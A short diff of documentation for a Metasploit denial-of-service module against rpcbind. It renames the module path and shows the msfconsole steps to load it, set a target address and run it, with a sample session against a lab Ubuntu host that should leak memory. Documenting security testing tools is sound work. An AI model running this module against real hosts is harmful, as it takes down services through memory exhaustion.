@@ -8,7 +8,7 @@ Exploiting this vulnerability allows an attacker to trigger large (and never fre
 ## Verification Steps
 
 1. Start msfconsole
-1. Do: `use auxiliary/dos/rpc/rpcbomb`
+1. Do: `use auxiliary/dos/rpc/rpcbind_bomb`
 1. Do: `set RHOSTS [IP]`
 1. Do: `run`
 1. Target should leak memory
@@ -18,7 +18,7 @@ Exploiting this vulnerability allows an attacker to trigger large (and never fre
 ### rpcbind 0.2.3-0.2 on Ubuntu 16.04 (amd64)
 
 ```
-msf > use auxiliary/dos/rpc/rpcbomb 
+msf > use auxiliary/dos/rpc/rpcbind_bomb
 msf auxiliary(rpcbomb) > set RHOSTS 10.0.2.7
 RHOSTS => 10.0.2.7
 msf auxiliary(rpcbomb) > run
